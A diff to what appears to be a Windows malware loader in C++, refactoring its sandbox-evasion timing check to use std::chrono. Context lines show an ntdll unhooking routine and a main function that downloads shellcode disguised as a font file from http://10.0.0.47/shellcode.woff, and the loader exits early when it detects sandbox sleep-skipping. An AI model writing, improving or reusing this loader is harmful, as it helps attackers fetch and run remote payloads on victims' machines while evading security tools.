@@ -3,11 +3,14 @@
 #include <stdlib.h>
 #include <wininet.h>
 #include <string.h>
+#include <chrono>
 #include <vector>
+#include <thread>
 #include <wincrypt.h>
 #include <psapi.h>
 #include <tlhelp32.h>
 #include <tchar.h>
+#include <time.h>
 #include <bcrypt.h>
 #include <iostream>
 #include <map>
@@ -118,20 +121,14 @@ void unhookNtll(){
 
 void evade() {
     
-    FILETIME startTime;
-    GetSystemTimeAsFileTime(&startTime);
-    Sleep(2000);
-    FILETIME endTime;
-    GetSystemTimeAsFileTime(&endTime);
-    ULARGE_INTEGER start, end;
-    start.LowPart = startTime.dwLowDateTime;
-    start.HighPart = startTime.dwHighDateTime;
-    end.LowPart = endTime.dwLowDateTime;
-    end.HighPart = endTime.dwHighDateTime;
-    ULONGLONG elapsedTime = end.QuadPart - start.QuadPart;
-    elapsedTime /= 10000000;
+    std::chrono::steady_clock::time_point startTime = std::chrono::steady_clock::now();
+    std::this_thread::sleep_for(std::chrono::milliseconds(2000));
+    std::chrono::steady_clock::time_point endTime = std::chrono::steady_clock::now();
+    std::chrono::duration<double> elapsedTime = endTime - startTime;
 
-    if (elapsedTime < 1.5) {
+    if (elapsedTime.count() < 1.5)
+    {
+        printf("Sleep duration is too short.\n");
         exit(0);
     }
 
@@ -157,7 +154,7 @@ int main() {
 	LPCWSTR url = L"http://10.0.0.47/shellcode.woff";
 
     if (!GetPayloadFromUrl(url, payload)) {
-        printf("Failed to download payload\n");
+        printf("Error reaching URI\n");
         return 1;
     }
 
